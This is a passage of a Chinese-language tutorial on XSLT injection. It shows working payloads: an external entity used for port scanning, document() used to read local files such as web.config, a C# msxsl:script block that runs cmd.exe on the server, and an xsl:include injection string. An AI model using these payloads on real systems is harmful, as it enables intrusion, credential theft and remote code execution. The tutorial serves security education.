
```
<?xml version="1.0" encoding="utf-8"?>

<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "259K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5%4x3W2)9J5k6e0p5$3i4K6u0W2x3e0x3J5i4K6u0W2x3g2)9K6b7e0t1#2">]>

<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

  <xsl:template match="/fruits">

    Fruits &ext_file;:

    <!-- Loop for each fruit -->

    <xsl:for-each select="fruit">

      <!-- Print name: description -->

      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>

    </xsl:for-each>

  </xsl:template>



</xsl:stylesheet>
```

下图展示了当我们试图连接到该 URL 时，应用返回的错误信息。透过该错误信息不难推断出25号端口处于关闭状态。

![](https://bbs.kanxue.com/upload/attach/201711/747240_f4oda7u8tnsvq2q.png)

当我们使用 [f41K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5%4x3W2)9J5k6e0p5$3i4K6u0W2x3e0x3J5i4K6u0W2x3g2)9K6b7e0p5J5x3K6b7`.](https://bbs.kanxue.com/elink@387K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5%4x3W2)9J5k6e0p5$3i4K6u0W2x3e0x3J5i4K6u0W2x3g2)9K6b7e0p5J5x3K6b7`.) 时，应用返回了不同的错误信息，透过该错误信息可以推断出1234号端口处于打开状态。

![](https://bbs.kanxue.com/upload/attach/201711/747240_35na068cp3lq5m8.png)

攻击者可以使用这种技术对受害者的内部网络进行侦察扫描。

## 使用 `document()` 函数窃取信息、扫描端口

`document()` 函数赋予了 XSLT 文档访问外部 XML 文档中除了主数据源之外的数据的能力。

通过将所有内容复制到转换结果中，该函数可以被滥用于读取远程系统上的文件。被读取的文件需要是一个格式正确的 XML 文档，但这基本上不算问题，因为敏感信息通常就是被存储在 XML 文件中。例如 ASP .NET Web 应用中的 `web.config` 文件就是一个很好的目标，因为该文件可能包含了数据库证书。

看一个例子。下面的 XSLT 文档可用于窃取 `C:\secrectfruit.xml` 文件中的内容：

```
<?xml version="1.0" encoding="utf-8"?>

<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

  <xsl:template match="/fruits">

    <xsl:copy-of select="document('C:\secretfruit.xml')"/>

    Fruits:

        <!-- Loop for each fruit -->

    <xsl:for-each select="fruit">

      <!-- Print name: description -->

      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>

    </xsl:for-each>

  </xsl:template>

</xsl:stylesheet>
```

转换结果在顶部显示了该秘密文件中的内容。

```
<fruits>

  <fruit>

    <name>Golden Apple</name>

    <description>Round, made of Gold</description>

  </fruit>

</fruits>

    Fruits:



      - Lemon: Yellow and sour

      - Watermelon: Round, green outside, red inside
```

与 XXE 攻击类似，`document()` 函数可被用于取出远程系统中的文档，也可使用 UNC 路径或者 URL 进行简单的端口扫描。下面是一个使用 URL 执行端口扫描的 XSLT 文档：

```
<?xml version="1.0" encoding="utf-8"?>

<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

  <xsl:template match="/fruits">

    <xsl:copy-of select="document('c6dK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5%4x3W2)9J5k6e0p5$3i4K6u0W2x3e0x3J5i4K6u0W2x3g2)9K6b7e0t1#2i4K6t1%4i4K6t1&6"/>

    Fruits:

        <!-- Loop for each fruit -->

    <xsl:for-each select="fruit">

      <!-- Print name: description -->

      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>

    </xsl:for-each>

  </xsl:template>

</xsl:stylesheet>
```

## 使用嵌入式脚本块进行远程代码执行

嵌入式脚本块属于专有 XSLT 扩展的功能，允许将代码直接包含在 XSLT 文档中。例如在微软的实现中，可以包含 C# 代码。当文档被解析后，包含在其中的代码会被远程服务器编译运行。

下面这个 XSLT 文档就是一个 [PoC](https://bbs.kanxue.com/elink@57eK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3u0S2K9h3E0W2i4K6u0W2j5$3!0E0i4K6u0r3N6$3W2C8K9g2)9J5c8W2m8a6b7H3`.`.) ，功能为列出当前工作目录下所有文件。

```
<?xml version="1.0" encoding="UTF-8"?>

<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"

xmlns:msxsl="urn:schemas-microsoft-com:xslt"

xmlns:user="urn:my-scripts">



<msxsl:script language = "C#" implements-prefix = "user">

<![CDATA[

public string execute(){

System.Diagnostics.Process proc = new System.Diagnostics.Process();

proc.StartInfo.FileName= "C:\\windows\\system32\\cmd.exe";

proc.StartInfo.RedirectStandardOutput = true;

proc.StartInfo.UseShellExecute = false;

proc.StartInfo.Arguments = "/c dir";

proc.Start();

proc.WaitForExit();

return proc.StandardOutput.ReadToEnd();

}

]]>

</msxsl:script>



  <xsl:template match="/fruits">

  --- BEGIN COMMAND OUTPUT ---

    <xsl:value-of select="user:execute()"/>

  --- END COMMAND OUTPUT ---    

  </xsl:template>

</xsl:stylesheet>
```

首先我们在 `xsl:stylesheet` 标签中定义了两个新的 XML 前缀。第一个 `xmlns:msxsl` 启用了微软的专有架构扩展，第二个 `xmlns:user` 声明了一个通过 `msxsl:script` 脚本块实现的用户自定义扩展。

上述 C# 代码实现了一个 `execute()` 函数，该函数先执行了命令 `cmd.exe /c dir`，然后以字符串的形式返回了该命令的输出。

最后该函数在 `xsl:value-of` 标签中被调用。

上述转换的结果其实与在 Windows 命令行中使用命令 `dir` 的输出一模一样。

```
--- BEGIN COMMAND OUTPUT ---

         Volume in drive C has no label.

 Volume Serial Number is EC7C-74AD



 Directory of C:\Users\context\Documents\Visual Studio 2015\Projects\XsltConsole

Application\XsltConsoleApplication\bin\Debug



22/02/2017  15:19    <DIR>          .

22/02/2017  15:19    <DIR>          ..

22/02/2017  13:30               258 data.xml

22/02/2017  14:48               233 external_transform.xslt

22/02/2017  15:15                12 secretfruit.txt

31/01/2017  13:45               154 secretfruit.xml

22/02/2017  15:29               831 transform.xslt

22/02/2017  13:49             7,168 XsltConsoleApplication.exe

26/01/2017  15:42               189 XsltConsoleApplication.exe.config

22/02/2017  13:49            11,776 XsltConsoleApplication.pdb

               8 File(s)         20,621 bytes

               2 Dir(s)   9,983,107,072 bytes free



  --- END COMMAND OUTPUT ---
```

## 江湖救急：`import`、`include`

`import` 和 `include` 标签可被用于关联多个 XSLT 文档。

如果我们遇到了这样的情况：只能在 XSLT 文档中间部分注入。这样一来，便不能直接使用 XML 外部实体攻击或者嵌入式脚本块了，因为这两者都需要注入点在文件的最顶端。此时，`import` 和 `include` 便可用来克服此类限制，具体来讲就是给该 XSLT 文档关联一个外部文档。当外部文档被加载后，整个文档会被解析，如果攻击者可以控制这个外部文档，那他们就可以在该外部文档中使用 XML 外部实体或嵌入式脚本了。这个外部文档可以是提前上传到服务器的文件，也可以是一个使用 URL 引用的位于攻击者电脑上的文件，只要文件内容是 XML 即可。

值得注意的是，`xsl:import` 标签只能作为 `xsl:stylesheet` 标签的第一个孩子使用，但是 `xsl:include` 标签则没有此限制。

此处使用了与之前一模一样的 XSLT 文档，同时假设我们只能在字符串 `"Your Company Name Here"` 这里注入。

```
<?xml version=”1.0” encoding=”utf-8"?>

<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

  <xsl:template match="/fruits">

    Your Company Name Here

    Fruits:

        <!-- Loop for each fruit -->

    <xsl:for-each select="fruit">

      <!-- Print name: description -->

      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>

    </xsl:for-each>

  </xsl:template>

  <xsl:include href="external_transform.xslt"/>

</xsl:stylesheet>
```

我们想要关联下面名为 `external_transform.xslt` 的外部 XSLT 文档。为了简化问题，此处该外部文档只是简单地打印了一条消息。但是值得一提的是，该外部文档可以替换为前面已经介绍过任意一个 XSLT 文档，包括那些需要在文件最顶部声明的文档，比如那个不能在此处直接使用的包含了嵌入式脚本块的文档。

```
<?xml version=”1.0” encoding=”utf-8”?>

<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

    <xsl:template match="/">

     Hello from the external transformation

    </xsl:template>

</xsl:stylesheet>
```

为了包含外部文档，我们需要插入以下标签。

```
<xsl:include href="external_transform.xslt"/>
```

但是这里有个问题，那就是 `xsl:include` 标签不能被包含在 `xsl:template` 标签之内，同时插入 `include` 标签的文件还必须是一个格式正确的 XML 文件。所以，第一步我们要做的就是关闭 `xsl:template` 标签，然后我们才能插入 `xsl:include` 标签，这样就满足了第一个条件。但是为了满足第二个条件，我们又需要在插入 `xsl:include` 标签之后重新打开 `xsl:template` 标签。于是最后的结果变成了这个样子：

```
</xsl:template><xsl:include href="external_transform.xslt"/><xsl:template name="a">
```

完成注入后，最终 XSLT 文档差不多如下：

```
<?xml version="1.0" encoding="utf-8"?>

<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

  <xsl:template match="/fruits">

    </xsl:template><xsl:include href="external_transform.xslt"/><xsl:template name="a">

    Fruits:

    <!-- Loop for each fruit -->

    <xsl:for-each select="fruit">

      <!-- Print name: description -->

      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>

    </xsl:for-each>

  </xsl:template>

  <xsl:include href="external_transform.xslt"/>

</xsl:stylesheet>
```

转换执行后会产生如下输出：

```
Hello from the external transformation
```

## 一个易受 XSLT 攻击的 APP

---

XSLT 漏洞到此已经介绍完毕，但是想要写出一个在实际情景中能够奏效的利用漏洞的 XSLT 文档可能并不如想象中的那般容易，一方面因为要严格符合 XML 的语法规范，另一方面是因为我们往往不能把握应用的实现细节。你可能在想，要是有个现成的应用让我练练手那该多好啊！
